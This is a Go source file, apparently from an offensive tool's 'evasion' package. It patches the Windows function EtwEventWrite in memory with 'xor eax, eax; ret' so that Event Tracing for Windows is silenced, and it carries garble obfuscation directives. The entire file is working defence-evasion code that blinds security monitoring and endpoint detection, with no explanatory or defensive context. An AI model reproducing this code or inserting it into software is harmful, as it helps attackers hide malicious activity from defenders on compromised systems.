//go:build windows
// +build windows

package evasion

import (
	"fmt"
	"syscall"
	"unsafe"
)

func PatchETW() error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("load ntdll: %w", err)
	}

	etwWrite, err := ntdll.FindProc("EtwEventWrite")
	if err != nil {
		return fmt.Errorf("find EtwEventWrite: %w", err)
	}

	addr := etwWrite.Addr()
	patch := [3]byte{0x33, 0xC0, 0xC3} // xor eax, eax; ret

	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), pageExecuteReadWrite, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect RWX: %w", err)
	}

	for i := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = patch[i]
	}

	if err := virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect restore: %w", err)
	}

	return nil
}
